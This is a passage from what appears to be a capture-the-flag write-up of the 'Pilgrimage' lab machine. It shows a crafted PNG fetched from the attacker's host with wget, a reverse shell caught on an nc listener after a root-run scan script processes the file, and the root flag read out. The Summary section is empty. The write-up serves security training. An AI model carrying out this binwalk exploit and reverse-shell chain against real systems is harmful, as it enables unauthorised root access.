cd /var/www/pilgrimage.htb/shrunk
```
and download place the file there
```shell
wget http://10.10.14.148:9001/binwalk_exploit.png
```

```shell
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.148:9001/binwalk_exploit.png
--2026-06-18 03:48:34--  http://10.10.14.148:9001/binwalk_exploit.png
Connecting to 10.10.14.148:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 534965 (522K) [image/png]
Saving to: ‘binwalk_exploit.png’

binwalk_exploit.png                  100%[======================================================================>] 522.43K  1.42MB/s    in 0.4s    

2026-06-18 03:48:35 (1.42 MB/s) - ‘binwalk_exploit.png’ saved [534965/534965]
```

## Shell as root

now wait for `malwarescan.sh` to process the file, and got shell on my listener, grabbed root flag
```shell
└─$ nc -lnvp 4445                                                                                                          
listening on [any] 4445 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.24.53] 40060
whoami
root
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@pilgrimage:~/quarantine# cd
cd
root@pilgrimage:~# cat root.txt
cat root.txt
57cf9c75ec79d3968d6b9cf28414c080
root@pilgrimage:~# 
```

---
# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 



---

# Sidenotes